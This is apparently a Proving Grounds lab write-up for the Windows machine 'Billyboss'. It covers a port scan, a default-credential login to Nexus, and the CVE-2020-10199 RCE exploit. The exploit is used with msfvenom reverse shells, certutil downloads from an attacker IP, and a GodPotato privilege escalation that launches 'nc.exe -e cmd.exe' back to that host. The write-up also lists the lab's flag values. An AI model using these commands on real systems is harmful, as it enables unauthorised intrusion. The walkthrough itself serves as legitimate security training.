---
title: Proving Grounds Practice — Billyboss      
date: 2025-07-14 00:00:00 +0800      
categories: [proving gounds]          
tags: [proving gounds]         
toc: true                           
comments: false                    
math: false                          
mermaid: false                       
---

- **OS**: Windows
- **Difficulty**: Intermediate

## Service Enumeration

**Port Scan Results**

**TCP**: 21, 80, 135, 139, 445, 5040, 7680, 8081, 49664, 49665, 49666, 49667, 49668, 49669

We run nmapAutomator to scan the target and found a few ports open.

> [nmapAutomator - GitHub](https://github.com/21y4d/nmapAutomator)

```bash
└─$ sudo ~/nmapAutomator/nmapAutomator.sh 192.168.179.61 All
[sudo] password for kali: 

Running all scans on 192.168.179.61

Host is likely running Unknown OS!


---------------------Starting Port Scan-----------------------



PORT     STATE SERVICE
21/tcp   open  ftp
80/tcp   open  http
135/tcp  open  msrpc
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
8081/tcp open  blackice-icecap



---------------------Starting Script Scan-----------------------


PORT     STATE SERVICE       VERSION
21/tcp   open  ftp           Microsoft ftpd
| ftp-syst: 
|_  SYST: Windows_NT
80/tcp   open  http          Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
|_http-title: BaGet
|_http-cors: HEAD GET POST PUT DELETE TRACE OPTIONS CONNECT PATCH
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds?
8081/tcp open  http          Jetty 9.4.18.v20190429
|_http-server-header: Nexus/3.21.0-05 (OSS)
|_http-title: Nexus Repository Manager
| http-robots.txt: 2 disallowed entries 
|_/repository/ /service/
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2025-07-14T12:21:20
|_  start_date: N/A



OS Detection modified to: Windows



---------------------Starting Full Scan------------------------


PORT      STATE SERVICE
21/tcp    open  ftp
80/tcp    open  http
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
5040/tcp  open  unknown
7680/tcp  open  pando-pub
8081/tcp  open  blackice-icecap
49664/tcp open  unknown
49665/tcp open  unknown
49666/tcp open  unknown
49667/tcp open  unknown
49668/tcp open  unknown
49669/tcp open  unknown
```

## Initial Access — Sonatype Nexus Repository Manager to RCE

We saw Nexus Repository Manager on port 8081, and we tried the credential nexus:nexus then successfully login.

![image-20260211040819801](assets/img/image-20260211040819801.png)

![image-20260211040822425](assets/img/image-20260211040822425.png)

found expoits on exploitDB.

> [Sonatype Nexus 3.21.1 — Remote Code Execution (Authenticated) - CVE-2020-10199](https://www.exploit-db.com/exploits/49385)

use msfvenom to generate reverse shell.

```bash
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.45.173 LPORT=80 -f exe -o shell.exe
```

![image-20260211040825490](assets/img/image-20260211040825490.png)

change CMD in exploits to download reverse shell using certutil.

```
vim exp.py
```

![image-20260211040828193](assets/img/image-20260211040828193.png)

![image-20260211040831146](assets/img/image-20260211040831146.png)

execute exploits to download reverse shell.

```
python3 exp.py
updog -p 80
```

![image-20260211040834079](assets/img/image-20260211040834079.png)

change CMD in exploits to execute reverse shell.

```
vim exp.py
```

![image-20260211040837113](assets/img/image-20260211040837113.png)

![image-20260211040839403](assets/img/image-20260211040839403.png)

execute exploits.

```
python3 exp.py
```

![image-20260211040841759](assets/img/image-20260211040841759.png)

listen port 80 and get shell.

```
nc -lvnp 80
```

![image-20260211040844554](assets/img/image-20260211040844554.png)

**local.txt value:** d7f94a628b75b8c43ec4412b63837378

![image-20260211040846910](assets/img/image-20260211040846910.png)

## Privilege Escalation — SeImpersonatePrivilege

it seems user nathan has SeImpersonatePrivilege, so we try to use godpotato to escalate our privilege.

> [GodPotato V1.20 - BeichenDream/GodPotato](https://github.com/BeichenDream/GodPotato/releases/tag/V1.20)

```bash
whoami /priv
```

![image-20260211040850043](assets/img/image-20260211040850043.png)

use msfvenom to generate reverse shell.

```bash
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.45.173 LPORT=80 -f exe -o shell2.exe
```

![image-20260211040852303](assets/img/image-20260211040852303.png)

download godpotato and netcat binary from attack machine.

- [GodPotato-NET4.exe](https://github.com/BeichenDream/GodPotato/releases/download/V1.20/GodPotato-NET4.exe)

> [nc.exe/nc64.exe - int0x33/nc.exe](https://github.com/int0x33/nc.exe/blob/master/nc64.exe)

```
certutil -urlcache -f http://192.168.45.173/GodPotato-NET.exe GodPotato-NET4.exe
updog -p 80

certutil -urlcache -f http://192.168.45.173/nc.exe nc.exe
updog -p 80
```

![image-20260211040855802](assets/img/image-20260211040855802.png)

![image-20260211040858301](assets/img/image-20260211040858301.png)

![image-20260211040901653](assets/img/image-20260211040901653.png)

![image-20260211040903645](assets/img/image-20260211040903645.png)

execute godpotato and use nc.exe to get reverse shell.

```bash
GodPotato-NET4.exe -cmd "nc.exe -e cmd.exe 192.168.45.173 445"
```

![image-20260211040906365](assets/img/image-20260211040906365.png)

listen port 445 and get shell.

![image-20260211040908831](assets/img/image-20260211040908831.png)

## Post Exploitation

**proof.txt value:** 5aa3af2fcef932e00bbcb33be8832255

![image-20260211040911518](assets/img/image-20260211040911518.png)
